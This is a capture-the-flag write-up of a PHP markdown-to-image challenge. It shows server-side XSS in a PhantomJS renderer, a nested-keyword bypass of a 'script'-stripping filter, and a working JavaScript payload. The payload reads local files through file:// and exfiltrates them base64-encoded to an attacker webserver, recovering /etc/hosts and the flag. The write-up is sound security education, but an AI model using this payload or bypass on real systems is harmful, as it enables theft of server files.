# Light recon:
Looking at the response headers `Server: Apache/2.4.18 (Ubuntu)`,  and the source code (which contains a `mstafa.php`) we will assume that we're dealing with PHP web application.
After doing a light fuzzing, nothing comes interesting except `flag.php` (won't go through how for the sake of keeping the writeup simple) browsing to it reveals nothing (so we must read it using LFI/RCE/SSTI ...)

# Markdown to PNG? : 
The form is rather simple, you submit something and it gets written to an image file which is sent back to us [screenshots]
Our request/response combo looks like this:
[burp]
filenames are random, the only possible attack vector is LFI (if the router takes our input (filename) and looks for it in another directory besides `pics/`) but i won't go through it for now and i'll assume that the files are processed THEN written inside `pics/` directory.

This kind of converters have been generally vulnerable to the so called "server side" XSS (mainly on dynamic pdf generators) where you can basically inject some html/js code that fetches local files, do SSRF etc...

Let's test that out:
[test]

it wasn't reflected as text this time but as html instead, we got a potential XSS
Let's see if we can run Javascript code:
[request]


Yes we can, did you noticed that "script" has been stripped out? [spoiler: there's a WAF in action ;) ]

Running Javascript code like this is cumbersome (e.g you have to escape quotes every now and then when writing complex code). So, let's see if we can include remote script:
[reques]

As mentioned, "script" has been stripped by the server, a common bypass for this is nesting one inside another like `scrscriptipt`, result in the "outer" script to be concatenated.

Aaaaand we got a request: [catched]



# Time to stop joking about XSS:
Looking at the `User-Agent` header we can see `PhantomJS/2.1.1` which is a headless browser, after googling for any known vulnerability we will come across this one: https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/
TLDR; we make the server load our remote script, which reads local files using `file://` scheme, and sends the base64 encoded file back to us.
	
innocent.js content:
```js
function reqListener () {
    var encoded = encodeURI(this.responseText);
    var b64 = btoa(this.responseText);
    var raw = this.responseText;
    document.write('<iframe src="http://<your_webserver>/exfil?data='+b64+'"></iframe>');
} 
var oReq = new XMLHttpRequest(); 
oReq.addEventListener("load", reqListener); 
oReq.open("GET", "file:///etc/hosts"); // file to read
oReq.send();
```
run your webserver to host the file and make the target server include it: [screen]
aaand we got a hit with the file being sent back to us:
[logs]
/etc/hosts file content: [screen]

Remember that `/flag.php` file? by default apache hosts files under `/var/www/html/`, let's check if it's in there
Same drill, edit the file to read and resend the XSS payload, after getting a hit on your local webserver base64 decode the exfil parameter's content:
[screen]
Flag: `thnb{3aaaaw3d_D3rd4k_aAasi_xsser}`


